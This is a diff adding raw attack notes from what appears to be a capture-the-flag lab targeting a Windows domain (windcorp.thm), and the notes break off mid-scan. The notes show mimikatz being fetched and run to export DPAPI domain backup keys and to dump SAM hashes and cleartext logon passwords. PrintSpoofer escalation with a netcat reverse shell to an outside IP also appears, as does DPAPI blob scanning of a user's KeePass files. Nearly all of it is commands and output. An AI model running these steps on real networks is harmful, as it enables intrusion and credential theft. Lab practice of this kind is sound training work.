@@ -1548,3 +1548,778 @@ https://cqureacademy.com/tools-from-dpapi-and-dpapi-ng-decryption-toolkit-black-
 
 steps to download it:
 
+unzip CQUREAcademy_DPAPIToolkit.txt
+mv CQUREAcademy_DPAPIToolkit.txt CQUREAcademy_DPAPIToolkit.zip
+7z x CQUREAcademy_DPAPIToolkit.zip
+pass:cqure
+
+not work
+so just crack it with john
+
+zip2john CQUREAcademy_DPAPIToolkit.zip > hash 
+
+┌──(root㉿kali)-[/home/kali/Osiris]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 140 password hashes with 140 different salts (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
+Loaded hashes with cost 1 (HMAC size) varying from 378 to 1533995
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:59:24 3.05% (ETA: 2023-01-05 18:44) 0g/s 141.3p/s 19863c/s 19863C/s ininin..happyfun
+Session aborted
+
+https://vulners.com/kitploit/KITPLOIT:6746021671609104143
+
+**Password: CQUREAcademy#123!**
+
+let's test it
+
+┌──(root㉿kali)-[/home/kali/Osiris]
+└─# 7z x CQUREAcademy_DPAPIToolkit.zip
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,32 CPUs Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz (806EC),ASM,AES-NI)
+
+Scanning the drive for archives:
+1 file, 6478300 bytes (6327 KiB)
+
+Extracting archive: CQUREAcademy_DPAPIToolkit.zip
+--
+Path = CQUREAcademy_DPAPIToolkit.zip
+Type = zip
+Physical Size = 6478300
+
+    
+Enter password (will not be echoed): CQUREAcademy#123!
+Everything is Ok                                                             
+
+Folders: 3
+Files: 140
+Size:       15696659
+Compressed: 6478300
+
+Actually I did test CQURE then watch https://www.youtube.com/watch?v=7D_WUJJKZdQ&t=1038s&ab_channel=BlackHat
+
+:)
+┌──(root㉿kali)-[/home/kali/Osiris/CQUREAcademy_DPAPIToolkit]
+└─# ls -lah
+-rw-r--r-- 1 root root  61K May 27  2015 CQMasterKeyAD.exe
+
+I'll upload here
+
+---
+
+*Evil-WinRM* PS C:\Users\WittyAle\Documents> Invoke-WebRequest -Uri http://10.8.19.103:1337/mimikatz.exe -outfile mimikatz.exe
+*Evil-WinRM* PS C:\Users\WittyAle\Documents> dir
+
+    Directory: C:\Users\WittyAle\Documents
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         1/4/2023   8:51 AM        1355264 mimikatz.exe
+
+*Evil-WinRM* PS C:\Users\WittyAle\Documents> ./mimikatz.exe "lsadump::backupkeys /system:localhost /export" "exit"
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # lsadump::backupkeys /system:localhost /export
+
+Current prefered key:       {07ea03b4-3b28-4270-8862-0bc66dacef1a}
+  * RSA key
+        |Provider name : Microsoft Strong Cryptographic Provider
+        |Unique name   :
+        |Implementation: CRYPT_IMPL_SOFTWARE ;
+        Algorithm      : CALG_RSA_KEYX
+        Key size       : 2048 (0x00000800)
+        Key permissions: 0000003f ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_EXPORT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
+        Exportable key : YES
+        Private export : OK - 'ntds_capi_0_07ea03b4-3b28-4270-8862-0bc66dacef1a.keyx.rsa.pvk'
+        PFX container  : OK - 'ntds_capi_0_07ea03b4-3b28-4270-8862-0bc66dacef1a.pfx'
+        Export         : OK - 'ntds_capi_0_07ea03b4-3b28-4270-8862-0bc66dacef1a.der'
+
+Compatibility prefered key: {887f3d05-3f50-4a1d-88c0-9a4b27e913c8}
+  * Legacy key
+92ce4fd5a55d6d7742135d325b09fd68aa0ad796fcc6eb2636663cec51a6b8fe
+2a8933f4a98f7f97c303495d6579f83bd3678c65f9ffa28eca94e1d7f674bd33
+90247312bf23dc6cd1ca1e1202748742dd0e80a48fb5579f5eeb4f461197f770
+2033abcde34ca01f22cc5326089c1b14fbe95ef4431eabb475f7d910a53a18f9
+11f0773bd40cf5382fdb0ea5c9e6fb12ad109fbd2195b71123ffc6bebd98ccfb
+6034895425694257da9679081b9bc74aa0eeeaf68ace38df4bd26cf4d4100b6c
+cf23bf6aef814bfcb824674b92fab623736d4f3187cbad2d0be6c893f191c8ea
+eeec95d2cbe0a3149813bd02532a9f0f1f951755a7137060ffad541446333057
+
+        Export         : OK - 'ntds_legacy_0_887f3d05-3f50-4a1d-88c0-9a4b27e913c8.key'
+
+mimikatz(commandline) # exit
+Bye!
+
+*Evil-WinRM* PS C:\Users\WittyAle\Documents> download ntds_capi_0_07ea03b4-3b28-4270-8862-0bc66dacef1a.pfx
+```
+```text
+┌──(kali㉿kali)-[~/ra]
+└─$ ls -lah
+total 62M
+drwxr-xr-x   2 kali kali 4.0K Jan  4 12:17  .
+drwxr-xr-x 111 kali kali  12K Jan  4 12:02  ..
+-rw-r--r--   1 kali kali   45 Nov 11 00:09 'Flag 1.txt'
+-rw-r--r--   1 kali kali  590 Nov 22 12:51  hash
+-rw-r--r--   1 kali kali   80 Nov 22 13:26  hosts.txt
+-rwxr-xr-x   1 kali kali 2.2M Jan  4 12:03  Invoke-Mimikatz.ps1
+-rw-r--r--   1 kali kali 1.3M Jan  4 11:44  mimikatz.exe
+-rw-r--r--   1 kali kali  756 Jan  4 12:16  ntds_capi_0_07ea03b4-3b28-4270-8862-0bc66dacef1a.der
+-rw-r--r--   1 kali kali 1.2K Jan  4 12:16  ntds_capi_0_07ea03b4-3b28-4270-8862-0bc66dacef1a.keyx.rsa.pvk
+-rw-r--r--   1 kali kali 2.5K Jan  4 12:16  ntds_capi_0_07ea03b4-3b28-4270-8862-0bc66dacef1a.pfx
+-rw-r--r--   1 kali kali  256 Jan  4 12:17  ntds_legacy_0_887f3d05-3f50-4a1d-88c0-9a4b27e913c8.key
+-rw-r--r--   1 kali kali  58M Nov 22 12:32  spark_3_0_0.deb
+
+---
+---
+Invoke-WebRequest "http://10.10.103.96:1234/PrintSpoofer.exe" -outfile "C:\temp\PrintSpoofer.exe"
+cd c:\temp
+Invoke-WebRequest "http://10.10.103.96:1234/nc.exe" -outfile "C:\temp\nc.exe"
+.\PrintSpoofer.exe -c ".\nc.exe -e cmd.exe 10.8.19.103 8888"
+
+mimikatz # privilege::debug                                            
+Privilege '20' OK
+
+mimikatz # token::elevate
+Token Id  : 0
+User name : 
+SID name  : NT AUTHORITY\SYSTEM
+
+820	{0;000003e7} 1 D 26929     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
+ -> Impersonated !
+ * Process Token : {0;000003e7} 0 D 4925357   	NT AUTHORITY\SYSTEM	S-1-5-18(04g,28p)	Primary
+ * Thread Token  : {0;000003e7} 1 D 4989776   	NT AUTHORITY\SYSTEM	S-1-5-18(04g,21p)	Impersonation (Delegation)
+
+mimikatz # lsadump::sam
+Domain : OSIRIS
+SysKey : fb2f42c056c3a91c3f8892df313f2481
+Local SID : S-1-5-21-2412384816-2079449310-1594074140
+
+SAMKey : deb70b7d4489f5a99f9a4b14d313a6d7
+
+RID  : 000001f4 (500)
+User : Administrator
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+  Hash NTLM: 68d59237d0413b8aa399130160f43832
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 87dd9bf09adb470a99630d9137859fcc
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WDAGUtilityAccount
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 1c10d48561f29e8597681814981354ab2cedbed8d66336efdc33efe4d142287c
+      aes128_hmac       (4096) : 2e5f16df97ea20475ab0900fee280c4f
+      des_cbc_md5       (4096) : 1320543e800131c8
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WDAGUtilityAccount
+    Credentials
+      des_cbc_md5       : 1320543e800131c8
+
+RID  : 000003eb (1003)
+User : scheduler
+  Hash NTLM: 641ca8dc1dc918cd16c054d4bcbb9edb
+    lm  - 0: 9ed1e5e7c677bc8294ec0ebc2d724670
+    ntlm- 0: 641ca8dc1dc918cd16c054d4bcbb9edb
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : fc94ba20e15b41688efa20c0c654eb66
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : OSIRIS.WINDCORP.THMscheduler
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : d19f5875d5fea2756ad7871e659973782b281dc37318aedb8b0550f73f1f7c6b
+      aes128_hmac       (4096) : 519f0f730dda41ae9cebac31e97ee2ef
+      des_cbc_md5       (4096) : ae454aea7c57f7b3
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : OSIRIS.WINDCORP.THMscheduler
+    Credentials
+      des_cbc_md5       : ae454aea7c57f7b3
+
+RID  : 000003ec (1004)
+User : hacker
+  Hash NTLM: 4c05b64dec614df2b522c401bb8d8994
+    lm  - 0: 121ad37d26a423d4484e8bb96d3088f6
+    ntlm- 0: 4c05b64dec614df2b522c401bb8d8994
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 92ebbe90b21210ec8336e49926c74858
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : OSIRIS.WINDCORP.THMhacker
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 4ec2de9f26b962dad27e403f8b6c410e418b5ef0cf7bc085bd24e10cf0ae6def
+      aes128_hmac       (4096) : e86614d880d775172389e8dfb0b09816
+      des_cbc_md5       (4096) : 68c43d979262528a
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : OSIRIS.WINDCORP.THMhacker
+    Credentials
+      des_cbc_md5       : 68c43d979262528a
+
+need to query
+
+mimikatz # ts::sessions
+
+Session: *0 - Services
+  state: Disconnected (4)
+  user :  @ 
+  curr : 1/4/2023 3:52:51 PM
+  lock : no
+
+Session: 1 - 
+  state: Disconnected (4)
+  user : alcrez @ WINDCORP
+  Conn : 1/4/2023 2:55:46 PM
+  disc : 1/4/2023 3:03:18 PM
+  logon: 1/4/2023 2:55:58 PM
+  last : 1/4/2023 3:03:18 PM
+  curr : 1/4/2023 3:52:51 PM
+  lock : no
+
+Session: 3 - Console
+  state: Connected (1)
+  user :  @ 
+  Conn : 1/4/2023 3:03:19 PM
+  curr : 1/4/2023 3:52:51 PM
+  lock : no
+
+Session: 4 - 
+  state: Disconnected (4)
+  user : hacker @ OSIRIS
+  Conn : 1/4/2023 3:41:33 PM
+  disc : 1/4/2023 3:41:37 PM
+  logon: 1/4/2023 3:03:52 PM
+  last : 1/4/2023 3:41:37 PM
+  curr : 1/4/2023 3:52:51 PM
+  lock : no
+
+Session: 65536 - 31C5CE94259D4006A9E4
+  state: Listen (6)
+  user :  @ 
+  lock : no
+
+Session: 65537 - RDP-Tcp
+  state: Listen (6)
+  user :  @ 
+  lock : no
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 2907544 (00000000:002c5d98)
+Session           : RemoteInteractive from 4
+User Name         : hacker
+Domain            : OSIRIS
+Logon Server      : OSIRIS
+Logon Time        : 1/4/2023 3:03:51 PM
+SID               : S-1-5-21-2412384816-2079449310-1594074140-1004
+	msv :	
+	 [00000003] Primary
+	 * Username : hacker
+	 * Domain   : OSIRIS
+	 * NTLM     : 4c05b64dec614df2b522c401bb8d8994
+	 * SHA1     : 86f032c64abb9b6da5031973abd1a2fa373fdfea
+	tspkg :	
+	wdigest :	
+	 * Username : hacker
+	 * Domain   : OSIRIS
+	 * Password : (null)
+	kerberos :	
+	 * Username : hacker
+	 * Domain   : OSIRIS
+	 * Password : (null)
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 2907512 (00000000:002c5d78)
+Session           : RemoteInteractive from 4
+User Name         : hacker
+Domain            : OSIRIS
+Logon Server      : OSIRIS
+Logon Time        : 1/4/2023 3:03:51 PM
+SID               : S-1-5-21-2412384816-2079449310-1594074140-1004
+	msv :	
+	 [00000003] Primary
+	 * Username : hacker
+	 * Domain   : OSIRIS
+	 * NTLM     : 4c05b64dec614df2b522c401bb8d8994
+	 * SHA1     : 86f032c64abb9b6da5031973abd1a2fa373fdfea
+	tspkg :	
+	wdigest :	
+	 * Username : hacker
+	 * Domain   : OSIRIS
+	 * Password : (null)
+	kerberos :	
+	 * Username : hacker
+	 * Domain   : OSIRIS
+	 * Password : hackP@ssw0rd
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 2889037 (00000000:002c154d)
+Session           : Interactive from 4
+User Name         : DWM-4
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 1/4/2023 3:03:50 PM
+SID               : S-1-5-90-0-4
+	msv :	
+	 [00000003] Primary
+	 * Username : OSIRIS$
+	 * Domain   : WINDCORP
+	 * NTLM     : 53ac087ef5ce0a0a38b47ede5e503ccd
+	 * SHA1     : 17b965312216e8e8fb0efb27d4dcc672acf1523f
+	tspkg :	
+	wdigest :	
+	 * Username : OSIRIS$
+	 * Domain   : WINDCORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : OSIRIS$
+	 * Domain   : windcorp.thm
+	 * Password : jX$=0W`_%B-)At]>;XJYg=$K-qC2\",Q)pnppnP&KBdeu =8"O1T'9N7soEJ s$g*=B[-hip0%iuQop4$.!'qy+V;"n'O?l?)Ne u:+jN<i6TDz!ENcE#=nX
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 2888990 (00000000:002c151e)
+Session           : Interactive from 4
+User Name         : DWM-4
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 1/4/2023 3:03:50 PM
+SID               : S-1-5-90-0-4
+	msv :	
+	 [00000003] Primary
+	 * Username : OSIRIS$
+	 * Domain   : WINDCORP
+	 * NTLM     : 53ac087ef5ce0a0a38b47ede5e503ccd
+	 * SHA1     : 17b965312216e8e8fb0efb27d4dcc672acf1523f
+	tspkg :	
+	wdigest :	
+	 * Username : OSIRIS$
+	 * Domain   : WINDCORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : OSIRIS$
+	 * Domain   : windcorp.thm
+	 * Password : jX$=0W`_%B-)At]>;XJYg=$K-qC2\",Q)pnppnP&KBdeu =8"O1T'9N7soEJ s$g*=B[-hip0%iuQop4$.!'qy+V;"n'O?l?)Ne u:+jN<i6TDz!ENcE#=nX
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 2882379 (00000000:002bfb4b)
+Session           : Interactive from 4
+User Name         : UMFD-4
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 1/4/2023 3:03:50 PM
+SID               : S-1-5-96-0-4
+	msv :	
+	 [00000003] Primary
+	 * Username : OSIRIS$
+	 * Domain   : WINDCORP
+	 * NTLM     : 53ac087ef5ce0a0a38b47ede5e503ccd
+	 * SHA1     : 17b965312216e8e8fb0efb27d4dcc672acf1523f
+	tspkg :	
+	wdigest :	
+	 * Username : OSIRIS$
+	 * Domain   : WINDCORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : OSIRIS$
+	 * Domain   : windcorp.thm
+	 * Password : jX$=0W`_%B-)At]>;XJYg=$K-qC2\",Q)pnppnP&KBdeu =8"O1T'9N7soEJ s$g*=B[-hip0%iuQop4$.!'qy+V;"n'O?l?)Ne u:+jN<i6TDz!ENcE#=nX
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 1348627 (00000000:00149413)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 1/4/2023 3:03:19 PM
+SID               : S-1-5-90-0-3
+	msv :	
+	 [00000003] Primary
+	 * Username : OSIRIS$
+	 * Domain   : WINDCORP
+	 * NTLM     : 53ac087ef5ce0a0a38b47ede5e503ccd
+	 * SHA1     : 17b965312216e8e8fb0efb27d4dcc672acf1523f
+	tspkg :	
+	wdigest :	
+	 * Username : OSIRIS$
+	 * Domain   : WINDCORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : OSIRIS$
+	 * Domain   : windcorp.thm
+	 * Password : jX$=0W`_%B-)At]>;XJYg=$K-qC2\",Q)pnppnP&KBdeu =8"O1T'9N7soEJ s$g*=B[-hip0%iuQop4$.!'qy+V;"n'O?l?)Ne u:+jN<i6TDz!ENcE#=nX
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 1348598 (00000000:001493f6)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 1/4/2023 3:03:19 PM
+SID               : S-1-5-90-0-3
+	msv :	
+	 [00000003] Primary
+	 * Username : OSIRIS$
+	 * Domain   : WINDCORP
+	 * NTLM     : 53ac087ef5ce0a0a38b47ede5e503ccd
+	 * SHA1     : 17b965312216e8e8fb0efb27d4dcc672acf1523f
+	tspkg :	
+	wdigest :	
+	 * Username : OSIRIS$
+	 * Domain   : WINDCORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : OSIRIS$
+	 * Domain   : windcorp.thm
+	 * Password : jX$=0W`_%B-)At]>;XJYg=$K-qC2\",Q)pnppnP&KBdeu =8"O1T'9N7soEJ s$g*=B[-hip0%iuQop4$.!'qy+V;"n'O?l?)Ne u:+jN<i6TDz!ENcE#=nX
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 1344521 (00000000:00148409)
+Session           : Interactive from 3
+User Name         : UMFD-3
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 1/4/2023 3:03:18 PM
+SID               : S-1-5-96-0-3
+	msv :	
+	 [00000003] Primary
+	 * Username : OSIRIS$
+	 * Domain   : WINDCORP
+	 * NTLM     : 53ac087ef5ce0a0a38b47ede5e503ccd
+	 * SHA1     : 17b965312216e8e8fb0efb27d4dcc672acf1523f
+	tspkg :	
+	wdigest :	
+	 * Username : OSIRIS$
+	 * Domain   : WINDCORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : OSIRIS$
+	 * Domain   : windcorp.thm
+	 * Password : jX$=0W`_%B-)At]>;XJYg=$K-qC2\",Q)pnppnP&KBdeu =8"O1T'9N7soEJ s$g*=B[-hip0%iuQop4$.!'qy+V;"n'O?l?)Ne u:+jN<i6TDz!ENcE#=nX
+	ssp :	
+	credman :	
+	cloudap :	
+
+Authentication Id : 0 ; 386343 (00000000:0005e527)
+Session           : Interactive from 1
+User Name         : alcrez
+Domain            : WINDCORP
+Logon Server      : FIRE
+Logon Time        : 1/4/2023 2:55:58 PM
+SID               : S-1-5-21-555431066-3599073733-176599750-1395
+	msv :	
+	 [00000003] Primary
+	 * Username : alcrez
+	 * Domain   : WINDCORP
+	 * NTLM     : 59390dfc44a2640ea82eb9812f670398
+	 * SHA1     : 88006ed121e0168e7d6dd0ac95496cf1f7c5e126
+	 * DPAPI    : 6c890b1acd51ce5b894651042ae3de9b
+	tspkg :	
+	wdigest :	
+	 * Username : alcrez
+	 * Domain   : WINDCORP
+	 * Password : (null)
+	kerberos :	
+	 * Username : alcrez
+	 * Domain   : WINDCORP.THM
+	 * Password : pepperKakehuS#12
+
+alcrez:pepperKakehuS#12
+---
+
+PS C:\temp> Invoke-WebRequest http://10.10.103.96:1234/ntds_capi_0_07ea03b4-3b28-4270-8862-0bc66dacef1a.pfx -o DMK.pfx
+PS C:\temp> dir
+dir
+
+    Directory: C:\temp
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----         9/16/2020  11:55 AM                OpenVPN                                                              
+-a----          1/6/2023   8:07 AM           2554 DMK.pfx                                                              
+-a----          1/6/2023   7:05 AM           6656 ivpn.exe                                                             
+-a----          1/6/2023   7:11 AM        1291016 mimikatz.exe  
+
+PS C:\temp> Invoke-WebRequest http://10.10.103.96:1234/CQMasterKeyAD.exe -o CQMasterKeyAD.exe
+PS C:\temp> Invoke-WebRequest http://10.10.103.96:1234/CQDPAPIBlobSearcher.exe -o CQDPAPIBlobSearcher.exe
+PS C:\temp> dir
+dir
+
+    Directory: C:\temp
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----         9/16/2020  11:55 AM                OpenVPN                                                              
+-a----          1/6/2023   8:09 AM         219648 CQDPAPIBlobSearcher.exe                                              
+-a----          1/6/2023   8:09 AM          62464 CQMasterKeyAD.exe                                                    
+-a----          1/6/2023   8:07 AM           2554 DMK.pfx                                                              
+-a----          1/6/2023   7:05 AM           6656 ivpn.exe                                                             
+-a----          1/6/2023   7:11 AM        1291016 mimikatz.exe                                                         
+
+PS C:\temp> ./CQDPAPIBlobSearcher.exe /d c:\users\chajoh\appdata\roaming /r /o c:\users\chajoh\Desktop
+./CQDPAPIBlobSearcher.exe /d c:\users\chajoh\appdata\roaming /r /o c:\users\chajoh\Desktop
+Scanning c:\users\chajoh\appdata\roaming\KeePass\KeePass.config.xml
+Scanning c:\users\chajoh\appdata\roaming\KeePass\ProtectedUserKey.bin
+Found 1 in c:\users\chajoh\appdata\roaming\keepass\protecteduserkey.bin
+ mkguid:               a773eede-71b6-4d66-b4b8-437e01749caa
+ flags:                0x0
+ hashAlgo:             0x8004 (SHA1)
+ cipherAlgo:           0x6603 (3DES)
+ cipherText:
+98 9A 82 53 43 24 EC E4 F7 F5 3A 0A 19 53 C6 89   ...SC$....:..S..
+49 86 2B 18 F2 A2 01 C9 50 0E 0B 2B DC A4 1E 46   I.+.....P..+...F
+C1 50 25 DC 99 B3 F7 3E B5 01 85 51 AB D9 C6 1D   .P%....>...Q....
+EC 6A 9A B8 A6 98 93 DB 8A F8 6F 1B 17 E7 02 25   .j........o....%
+64 95 95 8B CD 2C CD DB                           d....,..
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Crypto\Keys\de7cf8a7901d2ad13e5c67c29e5d1662_b77306f1-b261-48a9-a448-d1f57a99cfde
+Found 2 in c:\users\chajoh\appdata\roaming\microsoft\crypto\keys\de7cf8a7901d2ad13e5c67c29e5d1662_b77306f1-b261-48a9-a448-d1f57a99cfde
+ description:          Private Key Properties
+ mkguid:               a773eede-71b6-4d66-b4b8-437e01749caa
+ flags:                0x0
+ hashAlgo:             0x8004 (SHA1)
+ cipherAlgo:           0x6603 (3DES)
+ cipherText:
+0D 78 6B E1 B5 2C F4 6D 4C 55 85 FE C0 07 04 3D   .xk..,.mLU.....=
+11 1C 2B BA D7 6A B6 27 D3 B8 D4 B3 09 89 70 3F   ..+..j.'......p?
+E2 62 D8 C0 2B 2C 63 97 84 B7 41 92 34 70 AB 05   .b..+,c...A.4p..
+29 39 4B 61 D1 4A D6 44                           )9Ka.J.D
+ description:          Private Key
+ mkguid:               a773eede-71b6-4d66-b4b8-437e01749caa
+ flags:                0x0
+ hashAlgo:             0x8004 (SHA1)
+ cipherAlgo:           0x6603 (3DES)
+ cipherText:
+07 70 C4 CE 60 1B D8 C5 6E 5C 8D 03 16 1A 01 56   .p..`...n\.....V
+E2 B1 30 3C 5C CE A9 94 E8 12 BF 07 F6 9C 90 6F   ..0<\..........o
+A7 4E 50 79 77 17 7F 84 52 06 C1 2C 3F 72 89 E4   .NPyw...R..,?r..
+9E CF 05 06 09 74 0D 30 E4 8C CE 75 9E 35 69 F0   .....t.0...u.5i.
+65 82 1C D0 C5 11 8C 30 01 ED F6 42 39 70 D8 A2   e......0...B9p..
+1F 62 46 42 D8 39 2F 15 5D F4 2E CD D9 02 45 1C   .bFB.9/.].....E.
+E9 87 B5 50 26 CB 5D 74 28 62 69 C1 A7 40 E9 1C   ...P&.]t(bi..@..
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\desktop.ini
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\Microsoft Edge.lnk
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\Window Switcher.lnk
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\desktop.ini
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\File Explorer.lnk
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Microsoft Edge.lnk
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\MMC\eventvwr
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Network\Connections\Pbk\_hiddenPbk\rasphone.pbk
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Protect\CREDHIST
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Protect\SYNCHIST
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125\BK-WINDCORP
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125\Preferred
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Spelling\en-US\default.acl
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Spelling\en-US\default.dic
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Spelling\en-US\default.exc
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\SystemCertificates\My\AppContainerUserCertRead
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\AccountPictures\desktop.ini
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\CameraRoll.library-ms
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\desktop.ini
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\Documents.library-ms
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\Music.library-ms
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\Pictures.library-ms
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\SavedPictures.library-ms
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\Videos.library-ms
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\Database.kdbx.lnk
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\Database2.kdbx.lnk
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\desktop.ini
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\The Internet.lnk
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\User Accounts (2).lnk
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\User Accounts.lnk
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\AutomaticDestinations\5f7b5f1e01b83767.automaticDestinations-ms
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\AutomaticDestinations\7e4dca80246863e3.automaticDestinations-ms
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\AutomaticDestinations\ccba5a5986c77e43.automaticDestinations-ms
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\AutomaticDestinations\d97efdf3888fe7eb.automaticDestinations-ms
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\AutomaticDestinations\f01b4d95cf55d32a.automaticDestinations-ms
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\CustomDestinations\4ac866364817f10c.customDestinations-ms
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\CustomDestinations\7e4dca80246863e3.customDestinations-ms
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\CustomDestinations\9d1f905ce5044aee.customDestinations-ms
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\CustomDestinations\ccba5a5986c77e43.customDestinations-ms
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\CustomDestinations\f01b4d95cf55d32a.customDestinations-ms
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\CustomDestinations\f18460fded109990.customDestinations-ms
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\Bluetooth File Transfer.LNK
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\Compressed (zipped) Folder.ZFSendToTarget
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\Desktop (create shortcut).DeskLink
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\desktop.ini
+Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\Documents.mydocs
